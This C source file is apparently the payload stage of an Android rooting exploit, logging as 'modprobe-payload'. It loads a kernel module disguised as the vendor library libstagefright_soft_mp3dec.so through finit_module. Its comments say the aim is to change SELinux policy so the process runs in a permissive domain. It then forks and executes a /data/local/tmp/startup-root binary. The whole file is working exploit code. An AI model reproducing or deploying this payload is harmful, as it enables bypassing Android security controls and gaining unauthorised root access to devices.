#define _GNU_SOURCE
#include <unistd.h>
#include <dlfcn.h>
#include <ctype.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <errno.h>
#include <android/log.h>
#include <sys/syscall.h>
#include <linux/module.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "modprobe-payload", __VA_ARGS__); }

int _start() {
	const char *lib_mod = "/vendor/lib/libstagefright_soft_mp3dec.so";

	int fd = open(lib_mod, O_RDONLY);

	int ret = syscall(__NR_finit_module, fd, "", 0);
	if(ret != 0){
		// finit_module failed with:
		// EPERM 1: Not root or not has CAP_SYS_MODULE capability.
		// ENOEXEC 8: bad module file
		// EACCES 13: denied by selinux policy. current domain has no load_module permission.
		// EFAULT 14: module was loaded but something wrong on modifying selinux policy.
		// ENOMSG 42: ok. mymod returns ENOMSG even if succeed to load.
		LOGV("Error on finit_module: %s %d %d\n", lib_mod, ret, errno);
	}else{
		LOGV("Succeed on finit_module: %s %d\n", lib_mod, ret);
	}
	close(fd);

	// If succeed to load module, we now on a permissive domain.

	int fdnull = open("/dev/null", O_RDWR);
	dup2(fdnull, 0);
	dup2(fdnull, 1);
	dup2(fdnull, 2);

	if(fork() == 0){
		execve("/data/local/tmp/startup-root", 0, 0);
		LOGV("execve: %d\n", errno);
		exit(2);
		return 0;
	}

	exit(ret);
}
